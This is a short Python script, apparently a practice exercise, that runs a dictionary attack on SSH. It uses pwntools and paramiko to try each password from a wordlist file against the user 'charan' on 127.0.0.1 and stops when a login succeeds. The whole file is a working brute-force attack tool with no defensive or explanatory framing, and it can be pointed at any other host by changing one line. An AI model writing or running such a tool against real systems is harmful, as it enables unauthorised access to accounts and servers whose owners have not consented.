from pwn import *
import paramiko
attempts=0
host='127.0.0.1'
username='charan'
with open('wordlist.txt','rt') as passwordlist:
    for password in passwordlist:
        try:
            passw=password.strip()
            print("{} Attempting password: '{}'".format(attempts,passw))
            p=ssh(host=host,user=username,password=passw,timeout=1)
            if p.connected(): 
                print("[]>]password found: '{}'".format(passw))
                p.close()
                break
            p.close()
        except paramiko.AuthenticationException as e:
            print(e) 
        attempts+=1